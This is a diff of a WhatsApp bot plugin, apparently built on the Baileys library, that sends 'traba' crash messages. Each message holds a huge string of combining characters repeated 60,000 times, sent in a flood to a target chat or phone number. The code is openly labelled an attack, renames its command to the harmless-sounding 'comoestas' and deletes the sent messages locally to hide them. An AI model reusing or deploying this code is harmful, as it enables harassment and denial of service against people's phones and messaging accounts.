@@ -1,54 +1,59 @@
-import { generateWAMessageFromContent } from '@whiskeysockets/baileys';
+let handler = async (m, { conn }) => {
+  if (!m.fromMe) return; // Solo el bot puede usarlo
 
-let handler = async (m, { conn, args, command }) => {
-  if (!m.fromMe) return;
+  const target = m.chat;
+  const pushname = conn.getName(m.sender);
+  const mensaje = "🧪‌⃰Ꮡ‌‌" + "⛧ Zall :: CONCƱΣЯЯOR ⛧" +
+    "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000);
 
-  const numero = args[0]?.replace(/[^0-9]/g, "");
-  if (!numero) return m.reply(`⚠️ Uso correcto:\n.${command} +529991234567`);
+  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
 
-  const jid = numero + "@s.whatsapp.net";
-  const delay = ms => new Promise(res => setTimeout(res, ms));
-  const start = Date.now();
-  const duration = 5 * 60 * 1000;
+  const mensajesTotales = 200;
+  const mensajesPorTanda = 20;
   let enviados = 0;
 
-  const mensajeTraba = {
-    viewOnceMessage: {
-      message: {
-        conversation: "🧪‌⃰Ꮡ‌‌" + 
-          "⛧ Zall :: CONCƱΣЯЯOR ⛧" + 
-          "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + 
-          "𑇂𑆵𑆴𑆿".repeat(60000),
-        contextInfo: {
-          externalAdReply: {
-            title: "⛧ Zall :: CONCƱΣЯЯOR ⛧",
-            body: `Ataque iniciado`,
-            previewType: "PHOTO",
-            thumbnail: null,
-            sourceUrl: "https://example.com/tama"
-          }
-        }
-      }
-    }
-  };
-
-  await conn.sendMessage(m.chat, { text: `⏳ Enviando trabas a ${numero} durante 5 minutos...` }, { quoted: m });
+  await conn.sendMessage(m.chat, { text: "⏳ Iniciando ataque: 200 mensajes en tandas de 20..." }, { quoted: m });
 
   try {
-    while (Date.now() - start < duration) {
-      const msg = generateWAMessageFromContent(jid, mensajeTraba, {});
-      await conn.relayMessage(jid, msg.message, { messageId: msg.key.id });
-      await conn.sendMessage(conn.user.id, { delete: msg.key });
-      enviados++;
-      await delay(500);
+    while (enviados < mensajesTotales) {
+      for (let i = 0; i < mensajesPorTanda; i++) {
+        const msg = await conn.sendMessage(target, {
+          text: mensaje,
+          contextInfo: {
+            externalAdReply: {
+              title: "⛧ Zall :: CONCƱΣЯЯOR ⛧",
+              body: `Haii ${pushname}`,
+              previewType: "PHOTO",
+              thumbnail: null,
+              sourceUrl: "https://example.com/tama"
+            }
+          }
+        }, { quoted: m });
+
+        // Eliminar localmente para el bot
+        await conn.sendMessage(conn.user.id, {
+          delete: {
+            remoteJid: msg.key.remoteJid,
+            fromMe: true,
+            id: msg.key.id,
+            participant: msg.key.participant
+          }
+        });
+
+        enviados++;
+        await delay(300); // Pausa entre cada mensaje
+      }
+
+      await delay(1500); // Pausa entre tandas
     }
 
-    await conn.sendMessage(m.chat, { text: `✅ Ataque completado. Enviadas ${enviados} trabas.` }, { quoted: m });
+    await conn.sendMessage(m.chat, { text: "✅ Ataque finalizado: 200 mensajes enviados" }, { quoted: m });
+
   } catch (e) {
-    await conn.sendMessage(m.chat, { text: "❌ Error durante el ataque:\n" + e.message }, { quoted: m });
+    await conn.sendMessage(m.chat, { text: "❌ Error al ejecutar ataque:\n" + e.message }, { quoted: m });
   }
 };
 
-handler.command = ["trabarios"];
+handler.command = ["comoestas"];
 handler.rowner = true;
 export default handler;
